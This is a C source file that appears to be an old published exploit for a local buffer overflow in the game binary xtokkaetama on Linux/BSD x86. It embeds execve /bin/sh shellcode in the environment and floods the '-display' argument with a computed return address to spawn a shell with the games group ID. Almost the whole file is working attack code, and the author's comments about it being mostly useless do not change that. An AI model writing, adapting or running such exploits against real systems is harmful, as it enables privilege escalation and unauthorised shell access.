/*
 ** Linux/BSD x86 exploit vs xtokkaetama (c) gunzip
 ** I don't think you can do something nasty  
 ** with egid=games however (so this is mostly useless) 
 ** just written with the idea to make expl targetless.
 ** mostly ripped from gera's paper about bof :-o
 ** http://members.xoom.it/gunzip/
 ** gunzip@ircnet <techieone@softhome.net>
 **
*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>

#define SIZE		20
#define PATH 		"/usr/games/xtokkaetama"

unsigned long STACKBASE() 
{
	__asm__ ( "movl	%esp,	%eax" );
}

/**
 ** linux and bsd execve shellcode by me
 **/
unsigned char shellcode[] = 	
	"\x31\xc0\x99\x52\x68\x2f\x2f\x73"
	"\x68\x68\x2f\x62\x69\x6e\x89\xe3"
	"\x52\x53\x89\xe1\x52\x51\x53\x54"
	"\x8c\xe0\x85\xc0\x75\x04\xb0\x0b"
	"\xeb\x02\xb0\x3b\xcd\x80";

int main( int argc, char *argv[] )
{
	unsigned long	i, ret ;
	unsigned char	buf[ SIZE + 1 ],
			* env[]= { shellcode, NULL },
 			* run[]= { PATH, "-display", buf, NULL };

  	ret = ( ( STACKBASE() & 0xffff0000 ) | 0xfffa ) 
		- strlen(PATH) - strlen(shellcode) ;

	memset( buf, 0, sizeof(buf) );
  
  	for( i = 0; i < sizeof(buf) - 4; i += 4 ) 
		*(unsigned long *)&buf[i] = ret;

  	if( execve( run[0], (char **)run, (char **)env ) ) {	
		perror( "execve" );
		exit( -1 );
	}
}
